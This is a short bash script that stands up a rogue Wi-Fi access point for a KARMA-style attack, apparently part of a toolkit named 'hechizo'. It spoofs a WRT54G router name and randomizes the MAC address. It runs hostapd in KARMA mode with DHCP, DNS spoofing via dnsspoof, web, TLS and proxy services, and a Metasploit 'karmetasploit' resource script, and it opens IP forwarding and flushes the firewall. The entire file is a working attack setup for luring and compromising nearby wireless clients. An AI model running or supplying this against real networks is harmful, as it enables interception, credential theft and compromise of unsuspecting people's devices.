#!/bin/bash

phy=wlan0
conf=/etc/hechizo/hostapd-karma.conf
hostapd=/usr/lib/hechizo/hostapd

hostname WRT54G
echo hostname WRT54G
sleep 2

service network-manager stop
rfkill unblock wlan

ifconfig $phy down
macchanger -r $phy
ifconfig $phy up

sed -i "s/^interface=.*$/interface=$phy/" $conf
sed -i "s/^set INTERFACE .*$/set INTERFACE $phy/" /etc/hechizo/karmetasploit.rc
$hostapd $conf&
sleep 5
ifconfig $phy 10.0.0.1 netmask 255.255.255.0
route add -net 10.0.0.0 netmask 255.255.255.0 gw 10.0.0.1

dhcpd -cf /etc/hechizo/dhcpd.conf $phy
dnsspoof -i $phy -f /etc/hechizo/dnsspoof.conf&
service apache2 start
service stunnel4 start
tinyproxy -c /etc/hechizo/tinyproxy.conf&
msfconsole -r /etc/hechizo/karmetasploit.rc&

echo '1' > /proc/sys/net/ipv4/ip_forward
iptables --policy INPUT ACCEPT
iptables --policy FORWARD ACCEPT
iptables --policy OUTPUT ACCEPT
iptables -F
iptables -t nat -F

echo "Hit enter to kill me"
read
pkill hostapd
pkill dhcpd
pkill dnsspoof
pkill tinyproxy
pkill stunnel4
pkill ruby
service apache2 stop
iptables -t nat -F
